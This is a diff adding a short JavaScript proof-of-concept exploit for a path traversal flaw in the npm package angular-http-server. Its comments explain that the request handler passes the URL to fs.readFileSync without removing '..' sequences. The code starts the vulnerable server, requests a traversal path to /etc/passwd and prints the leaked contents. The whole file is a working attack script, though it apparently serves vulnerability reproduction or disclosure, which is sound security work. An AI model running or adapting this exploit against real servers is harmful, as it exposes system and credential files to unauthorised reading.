@@ -1,0 +1,32 @@
+```javascript
+// Exploit: Path Traversal in angular-http-server
+// Requiring the package immediately starts an HTTP server on port 8080.
+// The request handler does:
+//   var file = req.url.slice(1) || 'index.html';
+//   fs.stat(file, ...) -> fs.readFileSync(file)
+// with no sanitization of ".." sequences, allowing arbitrary file
+// disclosure outside the served directory (path traversal).
+
+const http = require("http");
+
+require("./node_modules/angular-http-server"); // starts server on 0.0.0.0:8080
+
+setTimeout(() => {
+  // Traverse out of the app directory to read an arbitrary file on disk,
+  // e.g. /etc/passwd
+  const target = "/../../../../../../../../etc/passwd";
+
+  http.get({ host: "127.0.0.1", port: 8080, path: target }, (res) => {
+    let body = "";
+    res.on("data", (chunk) => (body += chunk));
+    res.on("end", () => {
+      console.log("Status:", res.statusCode);
+      console.log("Leaked file contents:\n" + body);
+      process.exit(0);
+    });
+  }).on("error", (err) => {
+    console.error("Request failed:", err.message);
+    process.exit(1);
+  });
+}, 500);
+```
